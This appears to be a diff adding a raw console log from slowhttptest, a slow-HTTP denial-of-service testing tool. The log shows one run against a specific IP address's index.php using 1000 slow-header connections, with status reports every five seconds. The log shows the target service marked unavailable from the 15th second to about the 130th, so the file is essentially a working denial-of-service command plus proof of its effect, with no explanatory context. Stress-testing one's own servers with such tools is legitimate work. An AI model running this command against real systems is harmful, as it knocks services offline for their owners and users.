@@ -1,0 +1,814 @@
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 25 -t GET -u http://133.228.98.3/index.php
+-x 24 -p 3
+Sun Mar 19 02:24:48 2023:
+Sun Mar 19 02:24:48 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:24:48 2023:
+slow HTTP test status on 0th second:
+
+initializing:        0
+pending:             1
+connected:           0
+error:               0
+closed:              0
+service available:   YES
+Sun Mar 19 02:24:54 2023:
+Sun Mar 19 02:24:54 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:24:54 2023:
+slow HTTP test status on 5th second:
+
+initializing:        0
+pending:             2
+connected:           124
+error:               0
+closed:              0
+service available:   YES
+Sun Mar 19 02:24:59 2023:
+Sun Mar 19 02:24:59 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:24:59 2023:
+slow HTTP test status on 10th second:
+
+initializing:        0
+pending:             2
+connected:           248
+error:               0
+closed:              0
+service available:   YES
+Sun Mar 19 02:25:04 2023:
+Sun Mar 19 02:25:04 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:04 2023:
+slow HTTP test status on 15th second:
+
+initializing:        0
+pending:             2
+connected:           371
+error:               0
+closed:              0
+service available:   NO
+Sun Mar 19 02:25:09 2023:
+Sun Mar 19 02:25:09 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:09 2023:
+slow HTTP test status on 20th second:
+
+initializing:        0
+pending:             2
+connected:           494
+error:               0
+closed:              0
+service available:   NO
+Sun Mar 19 02:25:14 2023:
+Sun Mar 19 02:25:14 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:14 2023:
+slow HTTP test status on 25th second:
+
+initializing:        0
+pending:             1
+connected:           513
+error:               0
+closed:              105
+service available:   NO
+Sun Mar 19 02:25:19 2023:
+Sun Mar 19 02:25:19 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:19 2023:
+slow HTTP test status on 30th second:
+
+initializing:        0
+pending:             1
+connected:           592
+error:               0
+closed:              149
+service available:   NO
+Sun Mar 19 02:25:24 2023:
+Sun Mar 19 02:25:24 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:24 2023:
+slow HTTP test status on 35th second:
+
+initializing:        0
+pending:             60
+connected:           655
+error:               0
+closed:              150
+service available:   NO
+Sun Mar 19 02:25:29 2023:
+Sun Mar 19 02:25:29 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:29 2023:
+slow HTTP test status on 40th second:
+
+initializing:        0
+pending:             183
+connected:           655
+error:               0
+closed:              150
+service available:   NO
+Sun Mar 19 02:25:33 2023:
+Sun Mar 19 02:25:33 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:33 2023:
+slow HTTP test status on 45th second:
+
+initializing:        0
+pending:             109
+connected:           657
+error:               0
+closed:              234
+service available:   NO
+Sun Mar 19 02:25:38 2023:
+Sun Mar 19 02:25:38 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:38 2023:
+slow HTTP test status on 50th second:
+
+initializing:        0
+pending:             46
+connected:           655
+error:               0
+closed:              299
+service available:   NO
+Sun Mar 19 02:25:43 2023:
+Sun Mar 19 02:25:43 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:43 2023:
+slow HTTP test status on 55th second:
+
+initializing:        0
+pending:             39
+connected:           661
+error:               0
+closed:              300
+service available:   NO
+Sun Mar 19 02:25:48 2023:
+Sun Mar 19 02:25:48 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:48 2023:
+slow HTTP test status on 60th second:
+
+initializing:        0
+pending:             39
+connected:           661
+error:               0
+closed:              300
+service available:   NO
+Sun Mar 19 02:25:53 2023:
+Sun Mar 19 02:25:53 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:53 2023:
+slow HTTP test status on 65th second:
+
+initializing:        0
+pending:             39
+connected:           597
+error:               0
+closed:              364
+service available:   NO
+Sun Mar 19 02:25:58 2023:
+Sun Mar 19 02:25:58 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:25:58 2023:
+slow HTTP test status on 70th second:
+
+initializing:        0
+pending:             0
+connected:           551
+error:               0
+closed:              449
+service available:   NO
+Sun Mar 19 02:26:03 2023:
+Sun Mar 19 02:26:03 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:03 2023:
+slow HTTP test status on 75th second:
+
+initializing:        0
+pending:             0
+connected:           550
+error:               0
+closed:              450
+service available:   NO
+Sun Mar 19 02:26:08 2023:
+Sun Mar 19 02:26:08 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:08 2023:
+slow HTTP test status on 80th second:
+
+initializing:        0
+pending:             0
+connected:           550
+error:               0
+closed:              450
+service available:   NO
+Sun Mar 19 02:26:13 2023:
+Sun Mar 19 02:26:13 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:13 2023:
+slow HTTP test status on 85th second:
+
+initializing:        0
+pending:             0
+connected:           518
+error:               0
+closed:              482
+service available:   NO
+Sun Mar 19 02:26:18 2023:
+Sun Mar 19 02:26:18 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:18 2023:
+slow HTTP test status on 90th second:
+
+initializing:        0
+pending:             0
+connected:           402
+error:               0
+closed:              598
+service available:   NO
+Sun Mar 19 02:26:23 2023:
+Sun Mar 19 02:26:23 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:23 2023:
+slow HTTP test status on 95th second:
+
+initializing:        0
+pending:             0
+connected:           400
+error:               0
+closed:              600
+service available:   NO
+Sun Mar 19 02:26:28 2023:
+Sun Mar 19 02:26:28 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:28 2023:
+slow HTTP test status on 100th second:
+
+initializing:        0
+pending:             0
+connected:           400
+error:               0
+closed:              600
+service available:   NO
+Sun Mar 19 02:26:33 2023:
+Sun Mar 19 02:26:33 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:33 2023:
+slow HTTP test status on 105th second:
+
+initializing:        0
+pending:             0
+connected:           393
+error:               0
+closed:              607
+service available:   NO
+Sun Mar 19 02:26:38 2023:
+Sun Mar 19 02:26:38 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:38 2023:
+slow HTTP test status on 110th second:
+
+initializing:        0
+pending:             0
+connected:           265
+error:               0
+closed:              735
+service available:   NO
+Sun Mar 19 02:26:43 2023:
+Sun Mar 19 02:26:43 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:43 2023:
+slow HTTP test status on 115th second:
+
+initializing:        0
+pending:             0
+connected:           251
+error:               0
+closed:              749
+service available:   NO
+Sun Mar 19 02:26:48 2023:
+Sun Mar 19 02:26:48 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:48 2023:
+slow HTTP test status on 120th second:
+
+initializing:        0
+pending:             0
+connected:           250
+error:               0
+closed:              750
+service available:   NO
+Sun Mar 19 02:26:53 2023:
+Sun Mar 19 02:26:53 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:53 2023:
+slow HTTP test status on 125th second:
+
+initializing:        0
+pending:             0
+connected:           250
+error:               0
+closed:              750
+service available:   NO
+Sun Mar 19 02:26:58 2023:
+Sun Mar 19 02:26:58 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:26:58 2023:
+slow HTTP test status on 130th second:
+
+initializing:        0
+pending:             0
+connected:           147
+error:               0
+closed:              853
+service available:   YES
+Sun Mar 19 02:27:03 2023:
+Sun Mar 19 02:27:03 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:27:03 2023:
+slow HTTP test status on 135th second:
+
+initializing:        0
+pending:             0
+connected:           101
+error:               0
+closed:              899
+service available:   YES
+Sun Mar 19 02:27:08 2023:
+Sun Mar 19 02:27:08 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:27:08 2023:
+slow HTTP test status on 140th second:
+
+initializing:        0
+pending:             0
+connected:           100
+error:               0
+closed:              900
+service available:   YES
+Sun Mar 19 02:27:13 2023:
+Sun Mar 19 02:27:13 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:27:13 2023:
+slow HTTP test status on 145th second:
+
+initializing:        0
+pending:             0
+connected:           100
+error:               0
+closed:              900
+service available:   YES
+Sun Mar 19 02:27:18 2023:
+Sun Mar 19 02:27:18 2023:
+        slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://133.228.98.3/index.php
+verb:                             GET
+cookie:
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          25
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Sun Mar 19 02:27:18 2023:
+slow HTTP test status on 150th second:
+
+initializing:        0
+pending:             0
+connected:           25
+error:               0
+closed:              975
+service available:   YES
+Sun Mar 19 02:27:20 2023:
+Test ended on 151th second
+Exit status: No open connections left
+CSV report saved to slowhttp.csv
+HTML report saved to slowhttp.html
+
